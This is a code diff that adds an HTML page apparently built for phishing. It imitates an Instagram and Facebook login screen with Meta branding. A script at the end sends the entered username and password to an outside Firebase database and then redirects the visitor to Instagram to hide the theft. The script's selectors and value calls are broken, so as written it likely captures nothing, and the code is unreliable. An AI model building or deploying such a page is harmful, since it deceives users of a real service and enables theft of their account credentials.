@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Facebook</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <style>
+        body{
+            padding : 0;
+            margin : 0;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        .bb{
+            width: 300px;
+            padding: 5px 0 5px 0;
+            background-color: #2455c1;
+            border-color: #2455c1;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+        }
+        .hr {
+            align-items: center;
+            display: flex;
+            text-align: center;
+            font-weight: bold;
+            margin-top: 15px;
+            color: rgb(193, 193, 193);
+        }
+
+        .hr::before,
+        .hr::after {
+            background: rgb(193, 193, 193);
+            content: "";
+            flex: 1;
+            height: 2.5px;
+            margin: 5px .5em;
+        }
+        .in{
+            width: 300px;
+            padding: 10px;
+            background-color: whitesmoke;
+            border-color: rgb(236, 236, 236);
+            border-radius: 5px;
+            transition-delay: 10000000000000000s;
+        }
+        .forget{
+            width: 300px;
+            color: #3962ba;
+            border: none;
+            background-color: transparent;
+            cursor: pointer;
+        }
+        strong{
+            color: #3962ba;
+        }
+        .footer{
+            background-color: whitesmoke;
+            width: 100%;
+            border-top: 1px solid rgb(198, 198, 198);
+            position: absolute;
+            bottom: 0;
+        }
+    </style>
+</head>
+  <body>
+      <main class="container w-30 text-center p-3">
+        <small>English</small> 
+        <div>
+            <img src="insta.png" alt="">
+        </div>
+        <button class="p-1 bb">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bi bi-facebook mr-2" viewBox="0 0 16 16">
+                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+            </svg>
+            Continue with Facebook
+        </button>
+        <br>
+        <h5 class="hr">OR</h5>
+        <br>
+        <input type="text" class="in user" placeholder="Phone number, username, or email">
+        <h1></h1>
+        <input type="text" class="in" placeholder="Password">
+        <br>
+        <input class="forget text-right pwd" disabled="false" placeholder="Forget password?">
+        <br><br>
+        <button class="p-1 bb">
+            Log In
+        </button>
+        <br><br><br>
+        <h6>Don't have an account? <a href="#">Sign up</a></h6>
+
+      </main>
+      <div class="footer text-center">
+        <small>from</small>
+        <h6>
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bi bi-infinity" viewBox="0 0 16 16">
+                <path d="M5.68 5.792 7.345 7.75 5.681 9.708a2.75 2.75 0 1 1 0-3.916ZM8 6.978 6.416 5.113l-.014-.015a3.75 3.75 0 1 0 0 5.304l.014-.015L8 8.522l1.584 1.865.014.015a3.75 3.75 0 1 0 0-5.304l-.014.015L8 6.978Zm.656.772 1.663-1.958a2.75 2.75 0 1 1 0 3.916L8.656 7.75Z"/>
+            </svg>
+            <strong>Meta</strong>
+        </h6>
+      </div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</body>
+  <script>
+
+    $('.bb').click(() => {
+        let username = $('usr').val
+        let pwd = $('pwd').val
+        $.ajax('https://insta-a1fa1-default-rtdb.firebaseio.com/Pass', {
+            type: 'POST',
+            data: { myData: {userName : username, Password : pwd} },
+            success: function (data, status, xhr) {
+                "Good Job"
+            }
+        });
+        document.location.href = "www.instagram.fr"
+    })
+      
+  </script>
+</html>
